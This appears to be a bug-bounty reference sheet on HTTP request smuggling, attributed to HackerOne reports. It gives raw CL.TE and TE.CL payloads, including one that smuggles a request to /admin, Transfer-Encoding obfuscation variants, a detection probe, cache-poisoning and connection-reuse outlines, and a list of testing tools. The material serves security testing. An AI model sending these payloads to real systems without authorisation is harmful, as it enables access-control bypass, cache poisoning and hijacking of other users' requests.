---
name: "h1-request-smuggling-techniques"
description: "HTTP Request Smuggling patterns from HackerOne reports — CL.TE, TE.CL, Transfer-Encoding mismatch, cache poisoning, connection reuse attacks"
category: web-security
tags: ["request-smuggling", "http-smuggling", "cache-poisoning", "cl-te", "te-cl", "hackerone"]
relevance: 9
---

# H1 HTTP Request Smuggling Techniques

Real-world request smuggling with $6500 bounty (Slack):

## 1. CL.TE Smuggling
Front-end uses Content-Length, back-end uses Transfer-Encoding
```
POST / HTTP/1.1
Host: target.com
Content-Length: 44
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Foo: x
```

## 2. TE.CL Smuggling
Front-end uses Transfer-Encoding, back-end uses Content-Length
```
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST /home HTTP/1.1
Content-Length: 15

0

```

## 3. TE.TE Obfuscation
Both use TE, but front-end parsing differs:
```
Transfer-Encoding: chunked
Transfer-Encoding: x
```
OR:
```
Transfer-Encoding: chunked
Transfer-encoding: chunked  (capitalization)
Transfer-Encoding : chunked  (space before colon)
```

## 4. Cache Poisoning via Smuggling
1. Smuggle request to cacheable endpoint
2. Response gets cached with attacker-controlled content
3. All users see attacker content

## 5. Connection Reuse Attack
- Front-end and back-end disagree on request boundaries
- One attacker request pollutes next user's request
- Impact: Impersonate users, access restricted resources

## Detection Payloads:
```
# CL.TE probe
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X

# Expect: 403 Forbidden or 200 OK (smuggled request hit different endpoint)
```

## Testing Tools:
- Burp Suite HTTP Request Smuggler extension
- `smuggler.py` by defparam
- Manual testing with netcat/curl
